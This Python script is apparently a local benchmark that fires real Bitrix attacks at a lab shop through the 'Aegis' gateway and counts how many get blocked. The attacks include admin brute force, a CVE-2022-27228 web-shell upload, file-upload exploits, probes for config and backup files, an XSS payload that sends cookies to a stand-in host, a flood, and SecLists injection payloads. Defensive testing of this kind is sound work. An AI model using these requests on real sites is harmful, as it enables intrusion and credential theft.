"""Attack the 1C-Bitrix lab through Aegis: what real attackers do to Bitrix shops. Local lab only.

usage: python benchmarks/bitrix/attack.py   (gateway on 127.0.0.1:8092, Bitrix on :8093)
Each scenario uses its own client address (X-Forwarded-For) so bans do not mix.
"""
import json
import os
import random
from pathlib import Path

import requests

GW = "http://127.0.0.1:8092"
ORIGIN = "http://127.0.0.1:8093"
HOST = {"Host": "bx.localhost:8092"}
out = {}


def client(n):
    s = requests.Session()
    s.headers.update({**HOST, "X-Forwarded-For": f"198.51.100.{n}", "User-Agent": "Mozilla/5.0 (X11; Linux) Chrome/130"})
    return s


# 1. Password guessing on the admin login: the rest of the site stays open for that address.
s = client(1)
codes = [s.post(GW + "/bitrix/admin/index.php?login=yes", data={"AUTH_FORM": "Y", "TYPE": "AUTH", "USER_LOGIN": "admin",
                                                                  "USER_PASSWORD": f"guess{i}"}, allow_redirects=False).status_code
         for i in range(40)]
out["brute_force"] = {"attempts": 40, "answered_by_bitrix": sum(c in (200, 302) for c in codes),
                      "refused_429": codes.count(429), "first_refused_at": codes.index(429) + 1 if 429 in codes else None,
                      "site_still_readable": client(1).get(GW + "/catalog/").status_code == 200}

# 2. Known Bitrix attacks of the last years.
out["cve_2022_27228_vote_uf"] = client(2).post(
    GW + "/bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]"
         "=create_function&attachId[MODULE_ID]=vote&action=vote", files={"file": ("x.php", b"<?php system($_GET[c]);")}).status_code
out["html_editor_action_write"] = client(3).post(GW + "/bitrix/tools/html_editor_action.php",
                                                 data={"action": "uploadfile", "path": "/upload/x.php"}).status_code
out["attach_events_anywhere"] = client(4).post(GW + "/bitrix/components/bitrix/main.file.input/upload.php",
                                               data={"attachId[ENTITY_ID][events][onUploadSuccess][]": "system"}).status_code
out["backdoor_spread"] = client(5).get(GW + "/bitrix/tools/spread.php?c=id").status_code
out["read_settings"] = client(6).get(GW + "/bitrix/.settings.php").status_code
out["read_dbconn_backup"] = client(7).get(GW + "/bitrix/php_interface/dbconn.php~").status_code
out["backup_folder"] = client(8).get(GW + "/bitrix/backup/").status_code
out["upload_shell"] = client(9).get(GW + "/upload/iblock/abc/x.php?cmd=id").status_code
out["env_file"] = client(10).get(GW + "/.env").status_code

# 3. A forged "admin" request: a made-up sessid and Bitrix's session cookie name, HTML with a script.
r = client(11).post(GW + "/bitrix/admin/iblock_element_edit.php?IBLOCK_ID=2&type=catalog&ID=7&lang=ru",
                    data={"sessid": "0123456789abcdef0123456789abcdef", "DETAIL_TEXT": "<script>fetch('//x.top/?'+document.cookie)</script>",
                          "DETAIL_TEXT_TYPE": "html", "save": "Y"}, cookies={"BITRIX_SM_LOGIN": "admin", "PHPSESSID": "x"},
                    allow_redirects=False)
out["forged_admin_post"] = {"status": r.status_code, "answer": r.text[:100] if r.status_code == 403 else "reached Bitrix"}

# 4. Going around Aegis straight to the shop's server (the connector must refuse it).
out["direct_to_origin"] = requests.get(ORIGIN + "/", headers={"Host": "bx.localhost:8092"}).status_code

# 5. Flood: 400 page requests in a minute from one address.
s = client(12)
codes = [s.get(GW + f"/catalog/?n={i}", allow_redirects=False).status_code for i in range(400)]
out["flood"] = {"requests": 400, "ok": codes.count(200), "refused_429": codes.count(429)}

# 6. Real payloads (SecLists) in the shop's search and the catalog filter, one address each.
SECLISTS = os.environ.get("SECLISTS", "/tmp/realapps/seclists")
lists = {"sqli": "/Fuzzing/Databases/SQLi/Generic-SQLi.txt", "xss": "/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt",
         "traversal": "/Fuzzing/LFI/LFI-Jhaddix.txt", "cmd": "/Fuzzing/command-injection-commix.txt"}
random.seed(7)
payload_results, n = {}, 20
for kind, path in lists.items():
    p = Path(SECLISTS + path)
    lines = [x for x in p.read_text(errors="ignore").splitlines() if x.strip()]
    sample = random.sample(lines, min(150, len(lines)))
    blocked = 0
    for i, payload in enumerate(sample):
        n += 1
        s = client(n % 250 + 1)
        s.headers["X-Forwarded-For"] = f"203.0.113.{n % 250}"
        if i % 2:
            r = s.get(GW + "/search/", params={"q": payload})
        else:
            r = s.get(GW + "/catalog/dresses/", params={"arrFilter_P1_MIN": payload, "set_filter": "Y"})
        blocked += r.status_code == 403
    payload_results[kind] = {"sent": len(sample), "blocked": blocked, "rate": round(blocked / len(sample), 3)}
out["payloads"] = payload_results
print(json.dumps(out, ensure_ascii=False, indent=1))
